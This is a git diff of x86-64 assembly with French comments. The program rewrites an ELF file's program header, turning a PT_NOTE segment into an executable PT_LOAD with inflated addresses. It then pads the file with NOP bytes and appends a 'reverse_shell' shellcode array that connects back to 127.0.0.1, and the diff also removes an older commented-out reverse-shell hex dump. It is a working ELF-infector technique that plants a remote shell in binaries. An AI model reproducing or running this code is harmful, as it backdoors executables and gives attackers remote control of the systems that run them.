@@ -1,21 +1,22 @@
 section .data
     msg_error db "Erreur !", 0xa
     msg_error_len equ $ - msg_error
+
+
+
     tp_load db 0x01
+    offset_exagereted db 0x00,0x00 ,0x0c,0x00
+    droit_write_exe db 0x05
 
-    offset_exagereted db 0x00,0x00 ,0xc0,0x00
+    vaddr_exagereted db 0x00,0x00 ,0x4c,0x00
+    paddr_exagereted db 0x00,0x00 ,0x4c,0x00
 
 
 
-  ;31 ff 6a 09 58 99 b6 10  48 89 d6 4d 31 c9 6a 22  
-  ;41 5a 6a 07 5a 0f 05 48  85 c0 78 51 6a 0a 41 59  
-  ;50 6a 29 58 99 6a 02 5f  6a 01 5e 0f 05 48 85 c0  
-  ;78 3b 48 97 48 b9 02 00  24 73 7f 00 00 01 51 48  
-  ;89 e6 6a 10 5a 6a 2a 58  0f 05 59 48 85 c0 79 25 
-  ;49 ff c9 74 18 57 6a 23  58 6a 00 6a 05 48 89 e7  
-  ;48 31 f6 0f 05 59 59 5f  48 85 c0 79 c7 6a 3c 58  
-  ;6a 01 5f 0f 05 5e 6a 7e  5a 0f 05 48 85 c0 78 ed  
-  ;ff e6                                             
+
+    reverse_shell db 0x6a,0x0a,0x5e,0x31,0xdb,0xf7,0xe3,0x53,0x43,0x53,0x6a,0x02,0xb0,0x66,0x89,0xe1,0xcd,0x80,0x97,0x5b,0x68,0x7f,0x00,0x00,0x01,0x68,0x02,0x00,0x04,0xd2,0x89,0xe1,0x6a,0x66,0x58,0x50,0x51,0x57,0x89,0xe1,0x43,0xcd,0x80,0x85,0xc0,0x79,0x19,0x4e,0x74,0x3d,0x68,0xa2,0x00,0x00,0x00,0x58,0x6a,0x00,0x6a,0x05,0x89,0xe3,0x31,0xc9,0xcd,0x80,0x85,0xc0,0x79,0xbd,0xeb,0x27,0xb2,0x07,0xb9,0x00,0x10,0x00,0x00,0x89,0xe3,0xc1,0xeb,0x0c,0xc1,0xe3,0x0c,0xb0,0x7d,0xcd,0x80,0x85,0xc0,0x78,0x10,0x5b,0x89,0xe1,0x99,0xb2,0x6a,0xb0,0x03,0xcd,0x80,0x85,0xc0,0x78,0x02,0xff,0xe1,0xb8,0x01,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x00,0xcd,0x80
+
+    nonope db 0x90
 
 
 section .bss
@@ -84,6 +85,8 @@ _start:
 
 mov r15, buffer
 
+
+;a rendre dynamique plus tard
 parse_phdr:
   xor rcx, rcx                       ; zero out rcx
   xor rdx, rdx                       ; zero out rdx
@@ -113,7 +116,9 @@ parse_phdr:
 
     xor rax, rax
 
-; Déplacer le curseur à l'offset spécifié
+
+
+; =============== PT NOte to PT LOAD =================
     mov rax, 8          ; syscall number for lseek
     mov rdi, [file_descriptor]; descripteur de fichier
     mov rsi, [offset_tp]     ; offset
@@ -129,6 +134,29 @@ parse_phdr:
     mov rdx, 1 ; Longueur des nouvelles données à écrire
     syscall             ; Appel système   
 
+    
+; =============== Changement droit  =================
+xor rax, rax
+ ; Déplacer le curseur à l'offset spécifié
+    mov rax, 8          ; syscall number for lseek
+    mov rdi, [file_descriptor]; descripteur de fichier
+    mov rsi, [offset_tp]  
+    add rsi , 4   ; offset
+    mov rdx, 0          ; déplacement à partir du début du fichier
+    mov r10, 0          ; le déplacement à partir de l'offset spécifié
+    syscall       
+
+    xor rax, rax
+
+    mov rax, 1         
+    mov rdi, 3       ; Descripteur de fichier
+    mov rsi, droit_write_exe   ; Nouvelles données à écrire
+    mov rdx, 1 ; Longueur des nouvelles données à écrire
+    syscall             ; Appel système   
+
+
+
+; =============== Address offset  =================
     xor rax, rax
 
     ; Déplacer le curseur à l'offset spécifié
@@ -146,6 +174,96 @@ parse_phdr:
     mov rdi, 3       ; Descripteur de fichier
     mov rsi, offset_exagereted   ; Nouvelles données à écrire
     mov rdx, 3 ; Longueur des nouvelles données à écrire
+    syscall             ; Appel système   
+
+
+
+; =============== Virtual address  =================
+    xor rax, rax
+
+    ; Déplacer le curseur à l'offset spécifié
+    mov rax, 8          ; syscall number for lseek
+    mov rdi, [file_descriptor]; descripteur de fichier
+    mov rsi, [offset_tp]  
+    add rsi , 16   ; offset
+    mov rdx, 0          ; déplacement à partir du début du fichier
+    syscall       
+
+    xor rax, rax
+
+    mov rax, 1         
+    mov rdi, 3       ; Descripteur de fichier
+    mov rsi, vaddr_exagereted   ; Nouvelles données à écrire
+    mov rdx, 3 ; Longueur des nouvelles données à écrire
+    syscall             ; Appel système   
+
+
+
+; =============== physical address  =================
+    xor rax, rax
+
+    ; Déplacer le curseur à l'offset spécifié
+    mov rax, 8          ; syscall number for lseek
+    mov rdi, [file_descriptor]; descripteur de fichier
+    mov rsi, [offset_tp]  
+    add rsi , 24   ; offset
+    mov rdx, 0          ; déplacement à partir du début du fichier
+    syscall       
+
+    xor rax, rax
+
+    mov rax, 1         
+    mov rdi, 3       ; Descripteur de fichier
+    mov rsi, paddr_exagereted   ; Nouvelles données à écrire
+    mov rdx, 3 ; Longueur des nouvelles données à écrire
+    syscall             ; Appel système   
+
+
+
+; =============== Aggrandir le fichier  =================
+    xor r9, r9
+    size_up:
+
+    ; Déplacer le curseur à l'offset spécifié
+    mov rax, 8          ; syscall number for lseek
+    mov rdi, [file_descriptor]; descripteur de fichier
+    mov rsi, 0 
+    mov rdx, 2         ; déplacement à partir du début du fichier
+    syscall  
+
+    
+    mov rax, 1                   ; syscall number for write()
+    mov rdi, qword [file_descriptor] ; file descriptor
+    mov rsi, nonope     ; pointeur vers les données supplémentaires
+    mov rdx, 1 ; taille des données supplémentaires
+    syscall                      ; appel système pour écrire les données dans le fichier
+
+    inc r9
+    cmp r9, 0xc000
+    jg end_size_up
+
+    jmp size_up
+    end_size_up:
+
+
+
+; =============== Ajout shell code  =================
+
+
+    ; Déplacer le curseur à l'offset spécifié
+    mov rax, 8          ; syscall number for lseek
+    mov rdi, [file_descriptor]; descripteur de fichier
+    mov rsi, 0 
+    mov rdx, 2         ; déplacement à partir du début du fichier
+    syscall  
+
+
+     xor rax, rax
+
+    mov rax, 1         
+    mov rdi, 3       ; Descripteur de fichier
+    mov rsi, reverse_shell   ; Nouvelles données à écrire
+    mov rdx, 356 ; Longueur des nouvelles données à écrire
     syscall             ; Appel système   
 
 
